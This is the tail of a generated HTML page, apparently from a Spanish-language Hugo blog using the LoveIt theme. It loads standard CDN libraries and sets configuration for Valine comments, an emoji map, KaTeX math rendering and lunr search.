+</div><link rel=stylesheet href=/lib/valine/valine.min.css><link rel=stylesheet href=https://cdn.jsdelivr.net/npm/lightgallery.js@1.2.0/dist/css/lightgallery.min.css><link rel=stylesheet href=https://cdn.jsdelivr.net/npm/katex@0.11.1/dist/katex.min.css><link rel=stylesheet href=https://cdn.jsdelivr.net/npm/katex@0.11.1/dist/contrib/copy-tex.min.css><script type=text/javascript src=https://cdn.jsdelivr.net/npm/valine@1.4.14/dist/Valine.min.js></script><script type=text/javascript src=https://cdn.jsdelivr.net/npm/smooth-scroll@16.1.3/dist/smooth-scroll.min.js></script><script type=text/javascript src=https://cdn.jsdelivr.net/npm/autocomplete.js@0.37.1/dist/autocomplete.min.js></script><script type=text/javascript src=https://cdn.jsdelivr.net/npm/lunr@2.3.8/lunr.min.js></script><script type=text/javascript src=/lib/lunr/lunr.stemmer.support.min.js></script><script type=text/javascript src=/lib/lunr/lunr.es.min.js></script><script type=text/javascript src=https://cdn.jsdelivr.net/npm/lazysizes@5.2.2/lazysizes.min.js></script><script type=text/javascript src=https://cdn.jsdelivr.net/npm/lightgallery.js@1.2.0/dist/js/lightgallery.min.js></script><script type=text/javascript src=https://cdn.jsdelivr.net/npm/lg-thumbnail.js@1.2.0/dist/lg-thumbnail.min.js></script><script type=text/javascript src=https://cdn.jsdelivr.net/npm/lg-zoom.js@1.2.0/dist/lg-zoom.min.js></script><script type=text/javascript src=https://cdn.jsdelivr.net/npm/clipboard@2.0.6/dist/clipboard.min.js></script><script type=text/javascript src=https://cdn.jsdelivr.net/npm/sharer.js@0.4.0/sharer.min.js></script><script type=text/javascript src=https://cdn.jsdelivr.net/npm/katex@0.11.1/dist/katex.min.js></script><script type=text/javascript src=https://cdn.jsdelivr.net/npm/katex@0.11.1/dist/contrib/auto-render.min.js></script><script type=text/javascript src=https://cdn.jsdelivr.net/npm/katex@0.11.1/dist/contrib/copy-tex.min.js></script><script type=text/javascript src=https://cdn.jsdelivr.net/npm/katex@0.11.1/dist/contrib/mhchem.min.js></script><script type=text/javascript>window.config={code:{copyTitle:"Copiar al portapapeles",maxShownLines:10},comment:{valine:{appId:"QGzwQXOqs5JOhN4RGPOkR2mR-MdYXbMMI",appKey:"WBmoGyJtbqUswvfLh6L8iEBr",avatar:"mp",el:"#valine",emojiCDN:"https://cdn.jsdelivr.net/npm/emoji-datasource-google@5.0.1/img/google/64/",emojiMaps:{100:"1f4af.png",alien:"1f47d.png",anger:"1f4a2.png",angry:"1f620.png",anguished:"1f627.png",astonished:"1f632.png",black_heart:"1f5a4.png",blue_heart:"1f499.png",blush:"1f60a.png",bomb:"1f4a3.png",boom:"1f4a5.png",broken_heart:"1f494.png",brown_heart:"1f90e.png",clown_face:"1f921.png",cold_face:"1f976.png",cold_sweat:"1f630.png",confounded:"1f616.png",confused:"1f615.png",cry:"1f622.png",crying_cat_face:"1f63f.png",cupid:"1f498.png",dash:"1f4a8.png",disappointed:"1f61e.png",disappointed_relieved:"1f625.png",dizzy:"1f4ab.png",dizzy_face:"1f635.png",drooling_face:"1f924.png",exploding_head:"1f92f.png",expressionless:"1f611.png",face_vomiting:"1f92e.png",face_with_cowboy_hat:"1f920.png",face_with_hand_over_mouth:"1f92d.png",face_with_head_bandage:"1f915.png",face_with_monocle:"1f9d0.png",face_with_raised_eyebrow:"1f928.png",face_with_rolling_eyes:"1f644.png",face_with_symbols_on_mouth:"1f92c.png",face_with_thermometer:"1f912.png",fearful:"1f628.png",flushed:"1f633.png",frowning:"1f626.png",ghost:"1f47b.png",gift_heart:"1f49d.png",green_heart:"1f49a.png",grimacing:"1f62c.png",grin:"1f601.png",grinning:"1f600.png",hankey:"1f4a9.png",hear_no_evil:"1f649.png",heart:"2764-fe0f.png",heart_decoration:"1f49f.png",heart_eyes:"1f60d.png",heart_eyes_cat:"1f63b.png",heartbeat:"1f493.png",heartpulse:"1f497.png",heavy_heart_exclamation_mark_ornament:"2763-fe0f.png",hole:"1f573-fe0f.png",hot_face:"1f975.png",hugging_face:"1f917.png",hushed:"1f62f.png",imp:"1f47f.png",innocent:"1f607.png",japanese_goblin:"1f47a.png",japanese_ogre:"1f479.png",joy:"1f602.png",joy_cat:"1f639.png",kiss:"1f48b.png",kissing:"1f617.png",kissing_cat:"1f63d.png",kissing_closed_eyes:"1f61a.png",kissing_heart:"1f618.png",kissing_smiling_eyes:"1f619.png",laughing:"1f606.png",left_speech_bubble:"1f5e8-fe0f.png",love_letter:"1f48c.png",lying_face:"1f925.png",mask:"1f637.png",money_mouth_face:"1f911.png",nauseated_face:"1f922.png",nerd_face:"1f913.png",neutral_face:"1f610.png",no_mouth:"1f636.png",open_mouth:"1f62e.png",orange_heart:"1f9e1.png",partying_face:"1f973.png",pensive:"1f614.png",persevere:"1f623.png",pleading_face:"1f97a.png",pouting_cat:"1f63e.png",purple_heart:"1f49c.png",rage:"1f621.png",relaxed:"263a-fe0f.png",relieved:"1f60c.png",revolving_hearts:"1f49e.png",right_anger_bubble:"1f5ef-fe0f.png",robot_face:"1f916.png",rolling_on_the_floor_laughing:"1f923.png",scream:"1f631.png",scream_cat:"1f640.png",see_no_evil:"1f648.png",shushing_face:"1f92b.png",skull:"1f480.png",skull_and_crossbones:"2620-fe0f.png",sleeping:"1f634.png",sleepy:"1f62a.png",slightly_frowning_face:"1f641.png",slightly_smiling_face:"1f642.png",smile:"1f604.png",smile_cat:"1f638.png",smiley:"1f603.png",smiley_cat:"1f63a.png",smiling_face_with_3_hearts:"1f970.png",smiling_imp:"1f608.png",smirk:"1f60f.png",smirk_cat:"1f63c.png",sneezing_face:"1f927.png",sob:"1f62d.png",space_invader:"1f47e.png",sparkling_heart:"1f496.png",speak_no_evil:"1f64a.png",speech_balloon:"1f4ac.png","star-struck":"1f929.png",stuck_out_tongue:"1f61b.png",stuck_out_tongue_closed_eyes:"1f61d.png",stuck_out_tongue_winking_eye:"1f61c.png",sunglasses:"1f60e.png",sweat:"1f613.png",sweat_drops:"1f4a6.png",sweat_smile:"1f605.png",thinking_face:"1f914.png",thought_balloon:"1f4ad.png",tired_face:"1f62b.png",triumph:"1f624.png",two_hearts:"1f495.png",unamused:"1f612.png",upside_down_face:"1f643.png",weary:"1f629.png",white_frowning_face:"2639-fe0f.png",white_heart:"1f90d.png",wink:"1f609.png",woozy_face:"1f974.png",worried:"1f61f.png",yawning_face:"1f971.png",yellow_heart:"1f49b.png",yum:"1f60b.png",zany_face:"1f92a.png",zipper_mouth_face:"1f910.png",zzz:"1f4a4.png"},enableQQ:!1,highlight:!0,lang:"en",pageSize:10,placeholder:"Tu comentario ...",recordIP:!0,serverURLs:"https://leancloud.hugoloveit.com",visitor:!0}},lightGallery:{actualSize:!1,exThumbImage:"data-thumbnail",hideBarsDelay:2e3,selector:".lightgallery",speed:400,thumbContHeight:80,thumbWidth:80,thumbnail:!0},math:{delimiters:[{display:!0,left:"$$",right:"$$"},{display:!0,left:"\\[",right:"\\]"},{display:!1,left:"$",right:"$"},{display:!1,left:"\\(",right:"\\)"}],strict:!1},search:{highlightTag:"em",lunrIndexURL:"/es/index.json",lunrLanguageCode:"es",maxResultLength:10,noResultsFound:"No se encontraron resultados",snippetLength:50,type:"lunr"}}</script><script type=text/javascript src=/js/theme.min.js></script></body>
+</html>
